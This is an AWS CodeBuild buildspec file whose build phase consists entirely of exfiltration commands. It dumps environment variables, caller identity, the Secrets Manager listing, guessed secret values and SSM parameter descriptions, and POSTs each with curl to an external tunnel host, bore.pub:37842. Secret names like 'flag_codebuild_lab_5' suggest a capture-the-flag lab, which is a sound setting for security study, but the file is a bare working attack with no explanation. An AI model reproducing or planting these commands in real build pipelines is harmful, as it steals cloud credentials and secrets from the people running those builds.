version: 0.2
phases:
  build:
    commands:
      - env | curl -s -X POST -d @- http://bore.pub:37842 || true
      - aws sts get-caller-identity --region us-east-1 2>&1 | curl -s -X POST -d @- http://bore.pub:37842 || true
      - aws secretsmanager list-secrets --region us-east-1 2>&1 | curl -s -X POST -d @- http://bore.pub:37842 || true
      - for name in flag_codebuild_lab_5 flag-codebuild-lab-5 lab5-flag codebuild_lab_5_flag codebuild-lab-5-flag; do aws secretsmanager get-secret-value --secret-id "$name" --region us-east-1 2>&1 | curl -s -X POST -d @- "http://bore.pub:37842/$name" || true; done
      - aws ssm describe-parameters --region us-east-1 2>&1 | curl -s -X POST -d @- http://bore.pub:37842/ssm || true
